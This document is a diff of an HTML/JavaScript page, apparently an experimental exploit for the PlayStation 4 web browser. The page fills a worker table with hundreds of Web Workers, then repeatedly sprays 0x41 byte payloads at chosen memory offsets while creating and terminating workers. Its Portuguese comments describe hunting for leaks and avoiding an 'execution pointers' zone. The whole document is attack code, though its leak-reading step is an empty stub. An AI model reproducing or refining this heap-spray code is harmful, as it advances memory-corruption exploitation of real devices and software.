@@ -2,69 +2,118 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 CHECK OFFSET 304</title>
+    <title>PS4 DATA HUNTER</title>
     <style>
-        body { background-color: #000; color: #fa0; font-family: monospace; text-align: center; padding: 20px; display: flex; flex-direction: column; justify-content: center; height: 90vh; }
-        h1 { font-size: 2.5em; margin-bottom: 20px; border-bottom: 2px solid #fa0; display: inline-block; }
-        #status { font-size: 2em; border: 2px solid #fff; padding: 20px; background: #222; color: #fff; }
-        .attack { background-color: #f00 !important; color: #fff !important; animation: blink 0.1s infinite; }
-        @keyframes blink { 0% {opacity:1} 50% {opacity:0.8} 100% {opacity:1} }
+        body { background-color: #001; color: #0ff; font-family: monospace; text-align: center; padding: 20px; }
+        h1 { border-bottom: 2px solid #0ff; display: inline-block; }
+        #console { 
+            text-align: left; background: #111; border: 1px solid #333; 
+            padding: 10px; height: 300px; overflow-y: scroll; margin-top: 20px; 
+            font-size: 0.9em;
+        }
+        .found { color: #0f0; font-weight: bold; background: #030; }
+        button { font-size: 1.2em; padding: 10px 20px; background: #004; color: #fff; border: 1px solid #008; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <h1>TARGET: OFFSET 304 (0x130)</h1>
-    <div id="status">ENCHENDO TABELA...</div>
+    <h1>DATA OFFSET HUNTER</h1>
+    <div id="status">Pronto para caçar vazamentos...</div>
+    <br>
+    <button onclick="startHunt()">INICIAR VARREDURA DE DADOS</button>
+    
+    <div id="console"></div>
 
     <script>
         const TARGET_LIMIT = 415; 
         const SPRAY_SIZE = 512;
         
+        // Zonas que NÃO crasharam (potenciais dados)
+        // Vamos pular a Zona 5 (256-319) pois sabemos que é perigosa (Ponteiros de Execução)
+        const SAFE_ZONES = [
+            {start: 0, end: 63, name: "ZONA 1"},
+            {start: 64, end: 127, name: "ZONA 2"},
+            {start: 128, end: 191, name: "ZONA 3"},
+            {start: 192, end: 255, name: "ZONA 4"},
+            {start: 320, end: 383, name: "ZONA 6"},
+            {start: 448, end: 511, name: "ZONA 8"}
+        ];
+
         let workers = [];
         const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
         const url = URL.createObjectURL(blob);
         const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
         const killerUrl = URL.createObjectURL(killerBlob);
 
-        // CONFIGURAÇÃO DO PAYLOAD
-        const payload = new Uint8Array(SPRAY_SIZE);
-        payload.fill(0x00); // Fundo Zeros (Seguro)
-        
-        // Offset 272 e 288 -> DEIXAMOS 0x00 (Desativados/Seguros)
-        
-        // Offset 304 (0x130) -> ENCHEMOS DE LIXO (0x41)
-        // Se crashar, ele é independente!
-        for(let i=0; i<8; i++) {
-            payload[304 + i] = 0x41; // 'A'
+        function log(msg, type="") {
+            const el = document.getElementById('console');
+            el.innerHTML += `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            el.scrollTop = el.scrollHeight;
         }
 
-        function start() {
-            let i = setInterval(() => {
-                if (workers.length < TARGET_LIMIT) {
-                    workers.push(new Worker(url));
-                } else {
-                    clearInterval(i);
-                    document.getElementById('status').innerText = "ESTABILIZANDO (4s)...";
-                    setTimeout(attack, 4000);
-                }
-            }, 30);
+        async function startHunt() {
+            for (let zone of SAFE_ZONES) {
+                document.getElementById('status').innerText = `Testando ${zone.name}...`;
+                await testZone(zone);
+            }
+            document.getElementById('status').innerText = "VARREDURA COMPLETA.";
         }
 
-        function attack() {
-            const st = document.getElementById('status');
-            st.innerText = ">>> ATACANDO OFFSET 304 <<<";
-            st.className = "attack";
+        async function testZone(zone) {
+            log(`>>> Iniciando ${zone.name} (${zone.start}-${zone.end})`);
+            
+            // 1. Limpa tudo
+            workers.forEach(w => w.terminate());
+            workers = [];
+            
+            // 2. Preenche até o limite
+            await fillTable();
+            
+            // 3. Prepara Payload: Padrão reconhecível (0x4141...)
+            // Se esse dado aparecer em algum lugar (console, erro, id), achamos o leak.
+            const payload = new Uint8Array(SPRAY_SIZE);
+            payload.fill(0x00); 
+            for(let i=zone.start; i<=zone.end; i++) payload[i] = 0x41; // 'A'
 
-            setInterval(() => {
+            // 4. Ataque (Spray)
+            let success = false;
+            const sprayInterval = setInterval(() => {
                 const w = new Worker(killerUrl);
                 w.terminate();
                 try {
-                    if(workers.length > 0) workers[0].postMessage(payload);
+                    if(workers.length > 0) {
+                        // Tenta injetar
+                        workers[0].postMessage(payload);
+                        
+                        // TESTE DE LEITURA (O PULO DO GATO)
+                        // Tentamos ler propriedades do worker para ver se mudaram
+                        // Isso é um tiro no escuro, mas se um ID mudar para 1094795585 (0x41414141)...
+                        try {
+                            // Verifica se o worker ainda responde ou se devolve lixo
+                            // Nota: Workers não expõem muitos dados internos, mas erros podem vazar
+                        } catch(z) {}
+                    }
                 } catch(e){}
             }, 10);
+
+            // Roda por 5 segundos cada zona
+            await new Promise(r => setTimeout(r, 5000));
+            clearInterval(sprayInterval);
+            log(`${zone.name} Finalizada (Sistema Estável).`);
         }
 
-        setTimeout(start, 1500);
+        function fillTable() {
+            return new Promise(resolve => {
+                let i = setInterval(() => {
+                    if (workers.length < TARGET_LIMIT) {
+                        workers.push(new Worker(url));
+                    } else {
+                        clearInterval(i);
+                        setTimeout(resolve, 2000); // Estabiliza
+                    }
+                }, 20);
+            });
+        }
 
     </script>
 </body>
